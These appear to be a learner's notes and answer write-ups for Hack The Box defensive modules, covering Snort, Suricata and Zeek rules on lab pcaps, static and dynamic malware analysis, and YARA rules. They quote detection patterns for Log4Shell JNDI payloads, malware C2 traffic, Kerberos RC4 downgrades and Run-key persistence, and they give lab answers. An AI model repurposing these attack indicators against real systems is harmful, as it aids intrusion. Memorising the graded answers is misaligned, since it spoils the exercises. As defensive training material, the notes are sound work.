<p><code>Alerts</code>: When rules are configured, it is necessary to enable alerting (using the -A option) to view the details of detection events. There are multiple types of alert outputs available, including:</p>
<p><code>-A cmg</code>: This option combines <code>-A fast -d -e</code> and displays alert information along with packet headers and payload.</p>
<p><code>-A u2</code>: This option is equivalent to <code>-A unified2</code> and logs events and triggering packets in a binary file, which can be used for post-processing with other tools.</p>
<p><code>-A csv</code>: This option outputs fields in comma-separated value format, providing customization options and facilitating pcap analysis.</p>
<pre><code class="language-bash">$ snort --list-plugins | grep logger

$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /home/htb-student/pcaps/icmp.pcap -A cmg

$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /home/htb-student/pcaps/icmp.pcap -R /home/htb-student/local.rules -A cmg
</code></pre>
<p><strong>Q:</strong> There is a file named wannamine.pcap in the /home/htb-student/pcaps directory. Run Snort on this PCAP file and enter how many times the rule with sid 1000001 was triggered as your answer.</p>
<p><code>sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /home/htb-student/pcaps/wannamine.pcap -R /home/htb-student/local.rules -A cmg</code></p>
<pre><code>detection

             analyzed: 5146                
           hard_evals: 234
        file_searches: 2
               alerts: 234
         total_alerts: 234
               logged: 234
</code></pre>
<pre><code class="language-bash"># Snort Rule Development Example 1: Detecting Ursnif (Inefficiently)
alert tcp any any -&gt; any any (msg:&quot;Possible Ursnif C2 Activity&quot;; flow:established,to_server; content:&quot;/images/&quot;, depth 12; content:&quot;_2F&quot;; content:&quot;_2B&quot;; content:&quot;User-Agent|3a 20|Mozilla/4.0 (compatible|3b| MSIE 8.0|3b| Windows NT&quot;; content:!&quot;Accept&quot;; content:!&quot;Cookie|3a|&quot;; content:!&quot;Referer|3a|&quot;; sid:1000002; rev:1;)

$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/ursnif.pcap -A cmg

$ scp htb-student@[TARGET IP]:/home/htb-student/pcaps/ursnif.pcap .

# Snort Rule Development Example 2: Detecting Cerber
alert udp $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&quot;Possible Cerber Check-in&quot;; dsize:9; content:&quot;hi&quot;, depth 2, fast_pattern; pcre:&quot;/^[af0-9]{7}$/R&quot;; detection_filter:track by_src, count 1, seconds 60; sid:2816763; rev:4;)

$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/cerber.pcap -A cmg

# Snort Rule Development Example 3: Detecting Patchwork
alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&quot;OISF TROJAN Targeted AutoIt FileStealer/Downloader CnC Beacon&quot;; flow:established,to_server; http_method; content:&quot;POST&quot;; http_uri; content:&quot;.php?profile=&quot;; http_client_body; content:&quot;ddager=&quot;, depth 7; http_client_body; content:&quot;&amp;r1=&quot;, distance 0; http_header; content:!&quot;Accept&quot;; http_header; content:!&quot;Referer|3a|&quot;; sid:10000006; rev:1;)

$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg

# Snort Rule Development Example 4: Detecting Patchwork (SSL)
alert tcp $EXTERNAL_NET any -&gt; $HOME_NET any (msg:&quot;Patchwork SSL Cert Detected&quot;; flow:established,from_server; content:&quot;|55 04 03|&quot;; content:&quot;|08|toigetgf&quot;, distance 1, within 9; classtype:trojan-activity; sid:10000008; rev:1;)

$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg
</code></pre>
<p><strong>Q:</strong> There is a file named log4shell.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to log4shell exploitation attempts, where the payload is embedded within the <strong>user agent</strong>. Enter the keyword that should be specified right before the content keyword of the rule with sid 10000098 within the local.rules file so that an alert is triggered as your answer. Answer format: [keyword];</p>
<pre><code class="language-bash"># rule: http_header;
alert http any any -&gt; any any (msg:&quot;Log4shell Attempt Detected&quot;;http_header; content:&quot;|24 7b|jndi|3a|ldap|3a 2f 2f|&quot;,fast_pattern, nocase; sid:10000098; rev:1;)

$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/log4shell.pcap -A cmg 
</code></pre>
<h4 id="zeek">Zeek</h4>
<p><strong>Zeek Logs</strong>
conn.log: This log provides details about IP, TCP, UDP, and ICMP connections.</p>
<p>dns.log: Here, you'll find the details of DNS queries and responses.</p>
<p>http.log: This log captures the details of HTTP requests and responses.</p>
<p>ftp.log: Details of FTP requests and responses are logged here.</p>
<p>smtp.log: This log covers SMTP transactions, such as sender and recipient details.</p>
<pre><code class="language-bash"># Intrusion Detection With Zeek Example 1: Detecting Beaconing Malware
$ /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psempire.pcap
$ cat conn.log

# Intrusion Detection With Zeek Example 2: Detecting DNS Exfiltration
$ /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/dnsexfil.pcapng
$ cat dns.log
$ cat dns.log | /usr/local/zeek/bin/zeek-cut query | cut -d . -f1-7

# Intrusion Detection With Zeek Example 3: Detecting TLS Exfiltration
$ /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/tlsexfil.pcap
$ cat conn.log

$ cat conn.log | /usr/local/zeek/bin/zeek-cut id.orig_h id.resp_h orig_bytes | sort | grep -v -e '^$' | grep -v '-' | datamash -g 1,2 sum 3 | sort -k 3 -rn | head -10

# Intrusion Detection With Zeek Example 4: Detecting PsExec
$ /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psexec_add_user.pcap
$ cat smb_files.log
$ cat dce_rpc.log
$ cat smb_mapping.log
</code></pre>
<p><strong>Q1:</strong> There is a file named printnightmare.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to the PrintNightmare (https://labs.jumpsec.com/printnightmare-network-analysis/) vulnerability. Enter the zeek log that can help us <strong>identify the suspicious spooler functions</strong> as your answer. Answer format: _.log</p>
<p><code>/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/printnightmare.pcap &amp;&amp; ls</code></p>
<p><img alt="alt text" src="../assets/image21.png" /></p>
<p><strong>Q2:</strong> There is a file named revilkaseya.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to the REvil ransomware Kaseya supply chain attack. Enter the total number of bytes that the victim has transmitted to the IP address 178.23.155.240 as your answer.</p>
<pre><code class="language-bash">$ /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/revilkaseya.pcap

$ cat conn.log | grep &quot;178.23.155.240&quot;


$ cat conn.log | /usr/local/zeek/bin/zeek-cut id.orig_h id.resp_h orig_bytes | grep &quot;178.23.155.240&quot; | awk '{sum += $3} END {print sum}'This command efficiently filters and sums the bytes transmitted to the specified IP address directly from the conn.log file using standard Unix utilities (zeek-cut, grep, and awk).
</code></pre>
<p><img alt="alt text" src="../assets/image22.png" /></p>
<p>1702+609=2311</p>
<p><strong>Suricata Q:</strong>  There is a file named pipekatposhc2.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to WMI execution. Add yet another content keyword right after the msg part of the rule with sid 2024233 within the local.rules file so that an alert is triggered and enter the specified payload as your answer. Answer format: C____e</p>
<pre><code class="language-bash">$ cat local.rules | grep 2024233

alert tcp any any -&gt; any any (msg:&quot;WMI Execution Detected&quot;; content:&quot;Win32_ProcessStartup&quot;; content:&quot;powershell&quot;; sid:2024233; rev:2;)
</code></pre>
<p>In the context of WMI, when PowerShell scripts or commands are executed remotely, often there is a process creation event associated with it. The term “Create” can be a relevant keyword to include because it signifies the creation of processes, which is a common indicator in WMI-based execution scenarios.</p>
<pre><code class="language-bash">alert tcp any any -&gt; any any (msg:&quot;WMI Execution Detected&quot;; content:&quot;Create&quot;; content:&quot;Win32_ProcessStartup&quot;; content:&quot;powershell&quot;; sid:2024233; rev:2;)

# Add /home/htb-student/local.rules to rule-files
$ sudo vim /etc/suricata/suricata.yaml
$ sudo suricata -r /home/htb-student/pcaps/pipekatposhc2.pcap -l . -k none
$ cat fast.log

12/26/2019-08:04:55.353819  [**] [1:2024233:2] WMI Execution Detected [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.1.46:58198 -&gt; 192.168.1.62:49154
</code></pre>
<p><strong>Snort Q:</strong> There is a file named wannamine.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to the Overpass-the-hash technique which involves Kerberos encryption type downgrading. Replace XX with the appropriate value in the last content keyword of the rule with sid XXXXXXX within the local.rules file so that an alert is triggered as your answer.</p>
<p>In the context of Kerberos encryption types, each encryption type is identified by a specific number. RC4-HMAC encryption type is represented by the number 23 (0x17 in hexadecimal). When configuring an IDS/IPS rule to detect Kerberos encryption type downgrades to RC4, you need to specify the correct hexadecimal representation of the encryption type you’re looking for.</p>
<p>Here’s the breakdown:</p>
<p>RC4-HMAC encryption type is represented by the hexadecimal value 0x17.
In the Snort/Suricata rule syntax, hexadecimal values are typically written without the “0x” prefix.</p>
<p>Therefore, when you’re modifying the rule to detect Kerberos encryption type downgrades to RC4, you should use the hexadecimal representation of RC4-HMAC, which is 17.</p>
<p><code>alert tcp $HOME_NET any -&gt; any 88 (msg: "Kerberos Ticket Encryption Downgrade to RC4 Detected"; flow: no_stream, established, to_server; content: "|A1 03 02 01 05 A2 03 02 01 0A|", offset 12, depth 10; content: "|A1 03 02 01 02|", distance 5, within 6; content: "|A0 03 02 01 17|", distance 6, within 6; content: "krbtgt", distance 0; sid:9999999;)</code></p>
<p><strong>Zeek Q:</strong> There is a file named neutrinogootkit.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to the Neutrino exploit kit sending Gootkit malware. Enter the x509.log field name that includes the "MyCompany Ltd." trace as your answer.</p>
<pre><code class="language-bash">/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/neutrinogootkit.pcap

$ grep &quot;MyCompany Ltd.&quot; x509.log
</code></pre>
<p><img alt="alt text" src="../assets/image23.png" /></p>
<h2 id="introduction-to-malware-analysis">Introduction to Malware Analysis</h2>
<h4 id="windows-internals">Windows Internals</h4>
<p><strong>Q1:</strong> In the C:\Samples\MalwareAnalysis directory of this section's target, there is a file called potato.exe. Use pestudio (C:\Tools\pestudio\pestudio) to examine this executable's sections and provide the entropy of the .text section as your answer.</p>
<p><img alt="alt text" src="../assets/image24.png" /></p>
<p><strong>Q2:</strong>  In the C:\Samples\MalwareAnalysis directory of this section's target, there is a file called potato.exe. Use x64dbg (C:\Tools\x64dbg\release\x64) to open this executable and navigate to the Symbols tab. Enter the exported Kernel32.dll function whose name starts with "Attach". Answer format: Attach_</p>
<p><img alt="alt text" src="../assets/image25.png" /></p>
<h4 id="static-analysis-on-linux">Static Analysis On Linux</h4>
<p>Through static analysis, we endeavor to extract pivotal information which includes:</p>
<pre><code>File type
File hash
Strings
Embedded elements
Packer information
Imports
Exports
Assembly code
</code></pre>
<p><img alt="alt text" src="../assets/image26.png" /></p>
<p><strong>Identifying The File Type</strong></p>
<p><code>$ file /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe</code></p>
<p><strong>Malware Fingerprinting</strong></p>
<p><code>$ md5sum /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe</code></p>
<p><code>$ sha256sum /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe</code></p>
<p><strong>Use the pefile Python module to compute the IMPHASH of a file</strong></p>
<pre><code class="language-python"># imphash_calc.py
import sys
import pefile
import peutils

pe_file = sys.argv[1]
pe = pefile.PE(pe_file)
imphash = pe.get_imphash()

print(imphash)
</code></pre>
<p><code>$ python3 imphash_calc.py /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe</code></p>
<p><strong>Fuzzy Hashing (SSDEEP)</strong></p>
<p>The SSDEEP algorithm allocates more weight to longer sequences of common blocks, making it highly effective in identifying files that have undergone minor modifications, or are similar but not identical, such as different variations of a malicious sample.</p>
<p><code>$ ssdeep /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe</code></p>
<p>The command line arguments <code>-pb</code> can be used to initiate matching mode in SSDEEP (while we are on the directory where the malware samples are stored - <code>/home/htb-student/Samples/MalwareAnalysis</code> in our case).</p>
<p><code>$ ssdeep -pb *</code></p>
<p><strong>Section Hashing (Hashing PE Sections)</strong></p>
<p>Section hashing, (hashing PE sections) is a powerful technique that allows analysts to identify sections of a Portable Executable (PE) file that have been modified. This can be particularly useful for identifying minor variations in malware samples, a common tactic employed by attackers to evade detection.</p>
<p>By applying section hashing, security analysts can identify parts of a PE file that have been tampered with or altered. This can help identify similar malware samples, even if they have been slightly modified to evade traditional signature-based detection methods.</p>
<pre><code class="language-python"># section_hashing.py
import sys
import pefile
pe_file = sys.argv[1]
pe = pefile.PE(pe_file)
for section in pe.sections:
    print (section.Name, &quot;MD5 hash:&quot;, section.get_hash_md5())
    print (section.Name, &quot;SHA256 hash:&quot;, section.get_hash_sha256())
</code></pre>
<p><code>$ python3 section_hashing.py /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe</code></p>
<p><strong>String Analysis</strong></p>
<pre><code class="language-bash"># -n specifies to print a sequence of at least the number specified - in our case, 15.
$ strings -n 15 /home/htb-student/Samples/MalwareAnalysis/dharma_sample.exe
$ floss /home/htb-student/Samples/MalwareAnalysis/dharma_sample.exe
</code></pre>
<p><strong>Unpacking UPX-packed Malware</strong></p>
<p>Ultimate Packer for Executables (UPX)</p>
<p>In our static analysis, we might stumble upon a malware sample that's been compressed or obfuscated using a technique referred to as packing</p>
<pre><code class="language-bash">$ strings /home/htb-student/Samples/MalwareAnalysis/packed/credential_stealer.exe

# unpack the malware using the UPX tool
$ upx -d -o unpacked_credential_stealer.exe credential_stealer.exe

$ strings unpacked_credential_stealer.exe
</code></pre>
<h4 id="static-analysis-on-windows">Static Analysis On Windows</h4>
<p><strong>Identifying The File Type</strong></p>
<p>CFF Explorer</p>
<p><strong>Malware Fingerprinting</strong></p>
<p><code>Get-FileHash -Algorithm MD5 C:\Samples\MalwareAnalysis\Ransomware.wannacry.exe</code></p>
<p><code>Get-FileHash -Algorithm SHA256 C:\Samples\MalwareAnalysis\Ransomware.wannacry.exe</code></p>
<p><strong>File Hash Lookup</strong></p>
<p>VirusTotal</p>
<p><strong>Fuzzy Hashing (SSDEEP)</strong></p>
<p><code>ssdeep.exe C:\Samples\MalwareAnalysis\Ransomware.wannacry.exe</code></p>
<p><strong>Section Hashing (Hashing PE Sections)</strong></p>
<p>python code same as analysis on Linux</p>
<p>and</p>
<p>pestudio</p>
<p><strong>String Analysis</strong></p>
<pre><code class="language-bash">strings C:\Samples\MalwareAnalysis\dharma_sample.exe

floss shell.exe
</code></pre>
<p><strong>Unpacking UPX-packed Malware</strong></p>
<p><code>upx -d -o unpacked_credential_stealer.exe C:\Samples\MalwareAnalysis\packed\credential_stealer.exeupx -d -o unpacked_credential_stealer.exe C:\Samples\MalwareAnalysis\packed\credential_stealer.exe</code></p>
<h4 id="dynamic-analysis">Dynamic Analysis</h4>
<p>In dynamic analysis, we observe and interpret the behavior of the malware while it is running, or in action.</p>
<p><strong>Dynamic Analysis With Noriben</strong></p>
<p>Noriben uses ProcMon to capture system events but then filters and analyzes this data to extract meaningful information and pinpoint malicious activities.</p>
<pre><code class="language-bash">python .\Noriben.py
</code></pre>
<p>manually launch <code>ProcMon</code> (available at C:\Tools\sysinternals) using its default, more inclusive, configuration.</p>
<p><strong>Q:</strong> Use Noriben to perform dynamic analysis on shell.exe. Enter the IP address shell.exe pings as your answer.</p>
<p>127.0.0.1</p>
<h4 id="code-analysis">Code Analysis</h4>
<p><strong>Reverse Engineering &amp; Code Analysis</strong></p>
<p>A Disassembler is our tool of choice when we wish to conduct a static analysis of the code, meaning that we need not execute the code. Some prime examples of disassemblers include <code>IDA</code>, <code>Cutter</code>, and <code>Ghidra</code>.</p>
<p>A Debugger, on the other hand, serves a dual purpose. Like a disassembler, it decodes machine code into assembly instructions. Additionally, it allows us to execute code in a controlled manner, proceeding instruction by instruction, skipping to specific locations, or halting the execution flow at designated points using breakpoints. Examples of debuggers include <code>x32dbg</code>, <code>x64dbg</code>, <code>IDA</code>, and <code>OllyDbg</code>.</p>
<p><strong>Recognizing the Main Function in IDA</strong></p>
<p>The <code>start</code> function, which is the program's entry point and is generally responsible for setting up the runtime environment before invoking the actual <code>main</code> function. </p>
<p><code>Get-ChildItem env:TEMP</code></p>
<p><strong>Q:</strong> Download additional_samples.zip from this module's resources (available at the upper right corner) and transfer the .zip file to this section's target. Unzip additional_samples.zip (password: infected) and use IDA to analyze orange.exe. Enter the registry key that it modifies for persistence as your answer. Answer format: SOFTWARE____</p>
<pre><code>push    offset aNR      ; &quot;n\\R&quot;
push    offset aRsi     ; &quot;rsi&quot;
push    offset aRent    ; &quot;rent&quot;
push    offset aCu      ; &quot;\\Cu&quot;
push    offset aOw      ; &quot;ow&quot;
push    offset aTW      ; &quot;t\\W&quot;
push    offset aRoso    ; &quot;roso&quot;
push    offset aWareM   ; &quot;ware\\M&quot;
lea     eax, [ebp+74h+SubKey]
push    offset aSoftSicSfSindS ; &quot;Soft%sic%sf%sind%ss%sr%sVe%so%sun&quot;
push    eax             ; LPSTR
</code></pre>
<p>Replace <code>%s</code> use the strings above</p>
<p>Software\Microsoft\Windows\CurrentVersion\Run</p>
<p>Software\Microsoft\Windows\CurrentVersion\Run</p>
<p><strong>Simulating Internet Services</strong></p>
<pre><code class="language-bash">$ sudo nano /etc/inetsim/inetsim.conf

# Our machine's/VM's TUN IP: Host Kali's IP
service_bind_address &lt;Our machine's/VM's TUN IP&gt;
dns_default_ip &lt;Our machine's/VM's TUN IP&gt;
dns_default_hostname www
dns_default_domainname iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com

$ sudo vim /etc/default/inetsim
ENABLED=1

$ sudo inetsim 
</code></pre>
<p>1EF56DA0000
<a href="https://medium.com/@xNymia/malware-analysis-first-steps-creating-your-lab-21b769fb2a64">Configuring INetSim</a></p>
<h4 id="creating-detection-rules">Creating Detection Rules</h4>
<p><strong>YARA (Yet Another Recursive Acronym)</strong></p>
<pre><code class="language-bash">$ mkdir /home/htb-student/Samples/MalwareAnalysis/Test

$ cp /home/htb-student/Samples/MalwareAnalysis/shell.exe /home/htb-student/Samples/MalwareAnalysis/Test/

$ sudo python3 yarGen.py -m /home/htb-student/Samples/MalwareAnalysis/Test/

$ cat yargen_rules.yar 

$ yara /home/htb-student/yarGen-0.23.4/yargen_rules.yar /home/htb-student/Samples/MalwareAnalysis/
home_htb_student_Samples_MalwareAnalysis_Test_shell /home/htb-student/Samples/MalwareAnalysis//shell.exe
</code></pre>
<p>Yara documentation : https://yara.readthedocs.io/en/stable/writingrules.html</p>
<p>Yara resources - https://github.com/InQuest/awesome-yara</p>
<p>The DFIR Report - https://github.com/The-DFIR-Report/Yara-Rules</p>
<p><strong>Sigma</strong></p>
<p>Sigma documentation : https://github.com/SigmaHQ/sigma/wiki/Specification</p>
<p>Sigma resources - https://github.com/SigmaHQ/sigma/tree/master/rules</p>
<p>The DFIR Report - https://github.com/The-DFIR-Report/Sigma-Rules/tree/main/rules</p>
<h2 id="javascript-deobfuscation">JavaScript Deobfuscation</h2>
<p>https://jsconsole.com </p>
<p>https://obfuscator.io</p>
<p>There are many other JavaScript obfuscators, like <code>JJ Encode</code> or <code>AA Encode</code>. However, such obfuscators usually make code execution/compilation very slow, so it is not recommended to be used unless for an obvious reason, like bypassing web filters or restrictions.</p>
<h4 id="deobfuscate">Deobfuscate</h4>
<p>UnPacker: https://matthewfl.com/unPacker.html</p>
<p><code>$ curl -s http://SERVER_IP:PORT/ -X POST -d "param1=sample"</code></p>
<p><strong>Hex Encode</strong></p>
<p><code>$ echo https://www.hackthebox.eu/ | xxd -p</code></p>
<p><strong>Hex Decode</strong></p>
<p><code>$ echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r</code></p>
<p><strong>Caesar/Rot13</strong></p>
<p>Caesar cipher shifts each letter by a fixed number. </p>
<p>Rot13 shifts each character 13 times forward.</p>
<pre><code class="language-sh"># Rot13 Encode
$ echo https://www.hackthebox.eu/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Rot13 Decode
$ echo uggcf://jjj.unpxgurobk.rh/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'
</code></pre>
<p><a href="https://www.boxentriq.com/code-breaking/cipher-identifier">Cipher Identifier</a> can help us automatically determine the type of encoding. </p>
<p><code>$ curl -s http://94.237.63.132:48085/serial.php -X POST -d "serial=7h15_15_a_s3cr37_m3554g3"</code></p>
<h2 id="yara-sigma-for-soc-analysts">YARA &amp; Sigma for SOC Analysts</h2>
<p>Both YARA and Sigma rules grant SOC analysts potent capabilities to detect and respond to security threats. YARA excels in file and memory analysis, as well as pattern matching, whereas Sigma is particularly adept at log analysis and SIEM systems.</p>
<p>YARA rules: https://github.com/Yara-Rules/rules/tree/master/malware, https://github.com/mikesxrs/Open-Source-YARA-rules/tree/master</p>
<p>Sigma rules https://github.com/SigmaHQ/sigma/tree/master/rules, https://github.com/joesecurity/sigma-rules, https://github.com/mdecrevoisier/SIGMA-detection-rules</p>
<h4 id="yara-and-yara-rules">YARA and YARA Rules</h4>
<p>Each rule in YARA starts with the keyword <code>rule</code> followed by a <code>rule identifier</code>. Rule identifiers are case sensitive where the first character cannot be a digit, and cannot exceed 128 characters.</p>
<p>The following keywords are reserved and cannot be used as an identifier:</p>
<p><img alt="alt text" src="../assets/image27.png" /></p>
<pre><code>rule Ransomware_WannaCry {

    meta:
        author = &quot;Madhukar Raina&quot;
        version = &quot;1.0&quot;
        description = &quot;Simple rule to detect strings from WannaCry ransomware&quot;
        reference = &quot;https://www.virustotal.com/gui/file/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa/behavior&quot; 

    strings:
        $wannacry_payload_str1 = &quot;tasksche.exe&quot; fullword ascii
        $wannacry_payload_str2 = &quot;www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com&quot; ascii
        $wannacry_payload_str3 = &quot;mssecsvc.exe&quot; fullword ascii

    condition:
        all of them
}
</code></pre>
<pre><code class="language-sh"># yara
condition:
        filesize &lt; 100KB and (uint16(0) == 0x5A4D or uint16(0) == 0x4D5A)
</code></pre>
<p>This condition also specifies that the first 2 bytes of the file must be either 0x5A4D (ASCII MZ) or 0x4D5A (ASCII ZM), by using <code>uint16(0)</code></p>
<p><code>uint16</code>: This indicates the data type to be extracted, which is a 16-bit unsigned integer (2 bytes).</p>
<p><code>(0)</code>: The value inside the parentheses represents the offset from where the extraction should start. In this case, 0 means the function will extract the 16-bit value starting from the beginning of the data being scanned. The condition uses uint16(0) to compare the first 2 bytes of the file with specific values.</p>
<h4 id="developing-yara-rule">Developing YARA Rule</h4>
<pre><code>rule UPX_packed_executable
{
    meta:
    description = &quot;Detects UPX-packed executables&quot;

    strings: 
    $string_1 = &quot;UPX0&quot;
    $string_2 = &quot;UPX1&quot;
    $string_3 = &quot;UPX2&quot;

    condition:
    all of them
}
</code></pre>
<p><a href="https://github.com/Neo23x0/yarGen">yarGen</a> is our go-to tool when we need an automatic YARA rule generator.</p>
<pre><code class="language-sh">$ python3 yarGen.py -m /home/htb-student/temp -o htb_sample.yar
</code></pre>
<p><strong>Example 1: ZoxPNG RAT Used by APT17</strong></p>
<pre><code>/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-10-03
   Identifier: APT17 Oct 10
   Reference: https://goo.gl/puVc9q
*/

/* Rule Set ----------------------------------------------------------------- */

import &quot;pe&quot;

rule APT17_Malware_Oct17_Gen {
   meta:
      description = &quot;Detects APT17 malware&quot;
      license = &quot;Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE&quot;
      author = &quot;Florian Roth (Nextron Systems)&quot;
      reference = &quot;https://goo.gl/puVc9q&quot;
      date = &quot;2017-10-03&quot;
      hash1 = &quot;0375b4216334c85a4b29441a3d37e61d7797c2e1cb94b14cf6292449fb25c7b2&quot;
      hash2 = &quot;07f93e49c7015b68e2542fc591ad2b4a1bc01349f79d48db67c53938ad4b525d&quot;
      hash3 = &quot;ee362a8161bd442073775363bf5fa1305abac2ce39b903d63df0d7121ba60550&quot;
   strings:
      $x1 = &quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NETCLR 2.0.50727)&quot; fullword ascii
      $x2 = &quot;http://%s/imgres?q=A380&amp;hl=en-US&amp;sa=X&amp;biw=1440&amp;bih=809&amp;tbm=isus&amp;tbnid=aLW4-J8Q1lmYBM&quot; ascii

      $s1 = &quot;hWritePipe2 Error:%d&quot; fullword ascii
      $s2 = &quot;Not Support This Function!&quot; fullword ascii
      $s3 = &quot;Cookie: SESSIONID=%s&quot; fullword ascii
      $s4 = &quot;http://0.0.0.0/1&quot; fullword ascii
      $s5 = &quot;Content-Type: image/x-png&quot; fullword ascii
      $s6 = &quot;Accept-Language: en-US&quot; fullword ascii
      $s7 = &quot;IISCMD Error:%d&quot; fullword ascii
      $s8 = &quot;[IISEND=0x%08X][Recv:] 0x%08X %s&quot; fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize &lt; 200KB and (
            pe.imphash() == &quot;414bbd566b700ea021cfae3ad8f4d9b9&quot; or
            1 of ($x*) or
            6 of them
         )
      )
}
</code></pre>
<p><code>1 of ($x*)</code>: At least one of the $x strings (from the strings section) must be present in the file.</p>
<p><code>6 of them</code>: Requires that at least six of the strings (from both $x and $s categories) be found within the scanned file.</p>
<p><strong>Example 2: Neuron Used by Turla</strong></p>
<p>Perform .NET "reversing" using the <a href="https://www.mono-project.com/docs/tools+libraries/tools/monodis/">monodis</a> tool as follows.</p>
<pre><code class="language-sh">$ monodis --output=code Microsoft.Exchange.Service.exe
$ cat code

</code></pre>
<p><a href="https://github.com/dnSpy/dnSpy">dnSpy</a> is a .NET debugger and assembly editor like.</p>
<pre><code>rule neuron_functions_classes_and_vars {
 meta:
   description = &quot;Rule for detection of Neuron based on .NET functions and class names&quot;
   author = &quot;NCSC UK&quot;
   reference = &quot;https://www.ncsc.gov.uk/file/2691/download?token=RzXWTuAB&quot;
   reference2 = &quot;https://www.ncsc.gov.uk/alerts/turla-group-malware&quot;
   hash = &quot;d1d7a96fcadc137e80ad866c838502713db9cdfe59939342b8e3beacf9c7fe29&quot;
 strings:
   $class1 = &quot;StorageUtils&quot; ascii
   $class2 = &quot;WebServer&quot; ascii
   $class3 = &quot;StorageFile&quot; ascii
   $class4 = &quot;StorageScript&quot; ascii
   $class5 = &quot;ServerConfig&quot; ascii
   $class6 = &quot;CommandScript&quot; ascii
   $class7 = &quot;MSExchangeService&quot; ascii
   $class8 = &quot;W3WPDIAG&quot; ascii
   $func1 = &quot;AddConfigAsString&quot; ascii
   $func2 = &quot;DelConfigAsString&quot; ascii
   $func3 = &quot;GetConfigAsString&quot; ascii
   $func4 = &quot;EncryptScript&quot; ascii
   $func5 = &quot;ExecCMD&quot; ascii
   $func6 = &quot;KillOldThread&quot; ascii
   $func7 = &quot;FindSPath&quot; ascii
   $dotnetMagic = &quot;BSJB&quot; ascii
 condition:
   (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $dotnetMagic and 6 of them
}
</code></pre>
<p><code>uint16(uint32(0x3c)) == 0x4550</code>: A two-step check. First, it reads a 32-bit (4 bytes) value from offset <code>0x3c</code> of the file. In PE files, this offset typically contains a pointer to the PE header. It then checks whether the two bytes at that pointer are <code>PE (0x4550)</code>, indicating a valid PE header. This ensures the file is a legitimate PE format and not a corrupted or obfuscated one.</p>
<p><strong>Example 3: Stonedrill Used in Shamoon 2.0 Attacks</strong></p>
<p>Encrypted/compressed/obfuscated in PE files usually means high <a href="https://cocomelonc.github.io/malware/2022/11/05/malware-analysis-6.html">entropy</a>. We can use the <code>entropy_pe_section.py</code> script to check if our sample's resource section contains anything encrypted/compressed as follows.</p>
<pre><code class="language-python"># entropy_pe_section.py
#https://cocomelonc.github.io/malware/2022/11/05/malware-analysis-6.html
import argparse
import math
import pefile

def shannon_entropy(data):
    # 256 different possible values
    possible = dict(((chr(x), 0) for x in range(0, 256)))

    for byte in data:
        possible[chr(byte)] +=1

    data_len = len(data)
    entropy = 0.0

    # compute
    for i in possible:
        if possible[i] == 0:
            continue

        p = float(possible[i] / data_len)
        entropy -= p * math.log(p, 2)
    return entropy

def sections_entropy(path):
    pe = pefile.PE(path)
    for section in pe.sections[:4]:
        print(section.Name.decode('utf-8'))
        print(&quot;\tvirtual address: &quot; + hex(section.VirtualAddress))
        print(&quot;\tvirtual size: &quot; + hex(section.Misc_VirtualSize))
        print(&quot;\traw size: &quot; + hex(section.SizeOfRawData))
        print (&quot;\tentropy: &quot; + str(shannon_entropy(section.get_data())))

if __name__ == &quot;__main__&quot;:
    parser = argparse.ArgumentParser()
    parser.add_argument('-f','--file', required = True, help = &quot;target file&quot;)
    args = vars(parser.parse_args())
    target_file = args['file']
    with open(target_file, 'rb') as f:
        sections_entropy(target_file)
</code></pre>
<pre><code class="language-sh">$ python3 entropy_pe_section.py -f /home/htb-student/Samples/YARASigma/sham2.exe
</code></pre>
<pre><code>import &quot;pe&quot;
import &quot;math&quot;

rule susp_file_enumerator_with_encrypted_resource_101 {
meta:
  copyright = &quot;Kaspersky Lab&quot;
